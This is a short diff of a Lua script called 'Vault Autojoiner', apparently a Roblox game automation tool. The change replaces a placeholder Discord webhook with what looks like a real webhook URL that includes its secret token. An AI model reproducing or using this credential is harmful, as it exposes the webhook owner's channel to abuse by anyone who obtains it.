@@ -23,7 +23,7 @@ local TITLE = "Vault Autojoiner"
 local DISCORD = "https://discord.gg/cq29atkGA6"
 
 -- ===== CONFIGURATION WEBHOOK =====
-local WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_ICI" -- ⚠️ REMPLACE PAR TON WEBHOOK
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1494437937725837434/LK-b_JVnYLuZkdMpqeLnZoTpgzCY8ra01kKRe3LD-TDzNvTX0qtBGuTP9Prj-EDigti_" -- ⚠️ REMPLACE PAR TON WEBHOOK
 local RARITY_THRESHOLD = 20 -- Million/s minimum
 
 local state = {
